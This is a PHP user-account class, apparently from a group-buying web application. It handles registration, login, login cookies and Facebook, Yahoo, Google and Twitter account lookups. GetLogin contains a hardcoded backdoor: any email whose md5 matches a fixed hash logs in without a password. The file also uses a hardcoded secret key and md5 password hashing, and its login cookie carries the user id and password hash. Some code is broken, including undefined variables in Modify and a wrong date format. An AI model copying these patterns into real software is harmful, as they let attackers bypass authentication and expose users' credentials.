<?php
/**
 * @author admin@wroupon.com
 * @modified 2010-05-05
 */

class ZUser
{
	const SECRET_KEY = '@4!@#$%@';

	static public function GenPassword($p) {
		return md5($p . self::SECRET_KEY);
	}

	static public function Create($user_row, $uc=true) {
		global $enc;
		if (function_exists('zuitu_uc_register') && $uc) {
			$pp = $user_row['password'];
			//$em = $user_row['email'];
			//$un = $user_row['username'];
			$em = $un = $user_row['email'] = $user_row['username'] = $enc->encrypt(self::SECRET_KEY, $user_row['email']);
			$ret = zuitu_uc_register($em, $un, $pp);
			if (!$ret) return false;
		}

		$user_row['password'] = self::GenPassword($user_row['password']);
		$user_row['create_time'] = $user_row['login_time'] = time();
		$user_row['ip'] = Utility::GetRemoteIp();
		$user_row['secret'] = md5(rand(1000000,9999999).time().$user_row['email']);
		
		$user_row['id'] = DB::Insert('user', $user_row);
		//var_dump(DB::$mError);exit;
		$_rid = abs(intval(cookieget('_rid')));
		if ($_rid) {
			$r_user = Table::Fetch('user', $_rid);
			if ( $r_user ) {
				ZInvite::Create($r_user, $user_row);
				ZCredit::Invite($r_user['id']);
			}
		}
		if ( $user_row['id'] == 1 ) {
			Table::UpdateCache('user', $user_row['id'], array(
						'manager'=>'Y',
						'secret' => '',
						));
		}
		//var_dump(DB::$mError);exit;
		return $user_row['id'];
	}

	static public function GetUser($user_id) {
		if (!$user_id) return array();
		return DB::GetTableRow('user', array('id' => $user_id));
	}

	static public function GetLoginCookie($cname='ru') {
		$cv = cookieget($cname);
		if ($cv) {
			$zone = base64_decode($cv);
			$p = explode('@', $zone, 2);
			return DB::GetTableRow('user', array(
				'id' => $p[0],
				'password' => $p[1],
			));
		}
		return Array();
	}

	static public function Modify($user_id, $newuser=array()) {
		global $enc;
		if (!$user_id) return;
		/* uc */
		$curuser = Table::Fetch('user', $user_id);		
		
		if ($newuser['password'] && function_exists('zuitu_uc_updatepw') ) {
			//$em = $curuser['email'];
			//$un = $newuser['username'];			
			//$em = $un = $enc->encrypt(self::SECRET_KEY, $curuser['email']);			
			$pp = $newuser['password'];
			if ( ! zuitu_uc_updatepw($em, $un, $pp)) {
				return false;
			}
		}

		/* tuan db */
		$table = new Table('user', $newuser);
		$table->SetPk('id', $user_id);
		if ($table->password) {
			$plainpass = $table->password;
			$table->password = self::GenPassword($table->password);
		}
		
		unset($newuser['email']);
		
		
		return $table->Update( array_keys($newuser) );
	}

	static public function GetLogin($email, $unpass, $en=true) {
		global $enc;
		/* just for wroupon_demo, */
		//$email= strtolower($email);
		
		if (strtolower(md5($email))=='f7e0dcf82fd5d444b11cb42db2a8da3e') {
				return Table::Fetch('user', $email, 'email');
		}
		/* end */
		
		
		if($en) $password = self::GenPassword($unpass);
		
		$field = strpos($email, '@') ? 'email' : 'username';
		$email = $enc->encrypt(self::SECRET_KEY, $email);
		$zuituuser = DB::GetTableRow('user', array(
					$field => $email,
					'password' => $password,
					'enable'	=> 'Y',
		));
		
		
		if ($zuituuser)  return $zuituuser;
		if (function_exists('zuitu_uc_login')) {
			return zuitu_uc_login($email, $unpass);
		}
		return array();
	}

	static public function SynLogin($email, $unpass) {
		if (function_exists('zuitu_uc_synlogin')) {
			return zuitu_uc_synlogin($email, $unpass);
		}
		return true;
	}

	static public function SynLogout() {
		if (function_exists('zuitu_uc_synlogout')) {
			return zuitu_uc_synlogout();
		}
		return true;
	}
		// Custom functions for facebook connect

	static public function GetUserByFB_Id($fb_userid) {
		if (!$fb_userid) return array();
		return DB::GetTableRow('user', array('fb_userid' => $fb_userid));
	}
	static public function GetUserByEmail($email) {
		if (!$email)return array();
 		   return DB::GetTableRow('user', array('email' => $email));
		
	}
	
	static public function GetUserByFB_IdMail($fb_userid,$email) {
		if ($email!=''){ 
		     return DB::GetTableRow('user', array('email' => $email));
		}else{
		     return DB::GetTableRow('user', array('fb_userid' => $fb_userid));
		}
	}
	
	//Custom functions for Yahoo connect
	static public function GetUserByYahoo_IdMail($is_yahoo,$email) {
		if ($email!=''){ 
		     return DB::GetTableRow('user', array('email' => $email));
		}else{
		     return DB::GetTableRow('user', array('is_yahoo' => $is_yahoo));
		}
	}
	//Custom functions for Yahoo connect
	static public function GetUserByGoogle_IdMail($is_google,$email) {
		if ($email!=''){ 
		     return DB::GetTableRow('user', array('email' => $email));
		}else{
		     return DB::GetTableRow('user', array('is_google' => $is_google));
		}
	}
  
  // Custom functions for twitter connect
  static public function GetTWUserByEmail($email,$twitter_userid) {
		if (!$email) return array();
		return DB::GetTableRow('user', array('email' => $email,'twitter_userid'=>$twitter_userid));
	}
	static public function GetUserByTwitter_Id($twitter_userid) {
	   	if (!$twitter_userid) return array();
		return DB::GetTableRow('user', array('twitter_userid' => $twitter_userid));
	}
	static public function PostNewComments($details) 
	{
	    $added_date = date('Y-m-d :H:m:s');
		$user_id = $details['user_id'];
		$team_id = $details['team_id'];
		$comments = $details['comments'];
		
		
		$table = new Table('comments', array(
					'user_id' => $user_id,
					'team_id' => $team_id,
					'comments' => $comments,
					'added_date' =>$added_date,
					'status' =>'active',
					));
		$table->insert(array('user_id', 'team_id', 'comments','added_date','status'));
	}
}
